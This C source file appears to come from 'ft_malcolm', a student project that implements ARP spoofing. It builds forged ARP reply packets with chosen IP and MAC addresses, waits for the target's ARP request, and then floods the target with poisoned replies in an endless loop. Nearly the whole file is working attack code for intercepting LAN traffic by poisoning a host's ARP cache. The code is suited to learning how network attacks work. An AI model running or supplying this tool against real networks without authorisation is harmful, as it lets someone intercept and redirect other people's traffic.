#include "../includes/ft_malcolm.h"

void send_arp_packet(t_arp_packet *packet, struct sockaddr_ll socket_address) {
    ssize_t bytes_sent = sendto(g_data.sockfd, packet, sizeof(t_arp_packet), 0,
                        (struct sockaddr *)&socket_address, sizeof(struct sockaddr_ll));
    if (bytes_sent <= 0)
        exit_error("ft_malcolm: sendto() failed"); 
}

void flood_packet(t_arp_packet *packet, struct sockaddr_ll socket_address) {
    for (int i = 0; ; i++) {
        printf("Preparing to send ARP reply to the target, please wait...\n");
        send_arp_packet(packet, socket_address);
        if (g_data.verbose)
            print_packet(*packet);
        printf("Sent ARP reply packet %d\n", i);
        sleep(1);
    }
}

void create_socket_address(struct sockaddr_ll *socket_address, uint8_t *mac_target, int ifindex) {
    ft_memset(socket_address, 0, sizeof(struct sockaddr_ll));
    socket_address->sll_family = AF_PACKET;
    socket_address->sll_protocol = htons(ETH_P_ARP);
    socket_address->sll_ifindex = ifindex;
    socket_address->sll_hatype = htons(ARPHRD_ETHER);
    socket_address->sll_pkttype = PACKET_BROADCAST;
    socket_address->sll_halen = ETH_ALEN;
    memcpy(socket_address->sll_addr, mac_target, ETH_ALEN);
    socket_address->sll_addr[6] = 0x00;
    socket_address->sll_addr[7] = 0x00;
}

void create_arp_packet(t_arp_packet *packet, char **argv) {
    ft_memset(packet, 0, sizeof(t_arp_packet));

    // Ethernet header
    memcpy(packet->h_target, g_data.mac_target, ETH_ALEN);
    memcpy(packet->h_src, g_data.mac_src, ETH_ALEN);
    packet->h_proto = htons(ETH_P_ARP);

    // ARP header
    packet->hardware_type = htons(ETHERNET_10MB);
    packet->proto_type = htons(IPV4_TYPE);
    packet->hardware_addr_len = ETH_ALEN;
    packet->proto_addr_len = IP_ADDR_LEN; 
    packet->operation = htons(REPLY);

    if (!inet_pton(AF_INET, argv[IP_SRC], &packet->ip_src) ||
        !inet_pton(AF_INET, argv[IP_TARGET], &packet->ip_target)) {
        exit_error("Invalid IP address format");
    }
    memcpy(packet->mac_src, g_data.mac_src, ETH_ALEN);
    memcpy(packet->mac_target, g_data.mac_target, ETH_ALEN);
}

bool receive_arp_request(void) {
    t_arp_packet recv_packet;
    struct sockaddr_ll recv_addr;
    socklen_t addr_len = sizeof(recv_addr);

    ssize_t bytes_received = recvfrom(g_data.sockfd, &recv_packet, sizeof(t_arp_packet), 0,
                                      (struct sockaddr *)&recv_addr, &addr_len);
    if (bytes_received <= 0) {
        perror("recvfrom() failed");
        return false;
    }

    if (ntohs(recv_packet.operation) == REQUEST &&
        ntohs(recv_packet.proto_type) == IPV4_TYPE &&
        ntohs(recv_packet.hardware_type) == ETHERNET_10MB &&
        ft_memcmp(&recv_packet.ip_src, &g_data.ip_target, sizeof(recv_packet.ip_target)) == 0) {
        printf("Received ARP request for target IP\n");
        if (g_data.verbose)
            print_packet(recv_packet);
        return true;
    }
    return false;
}
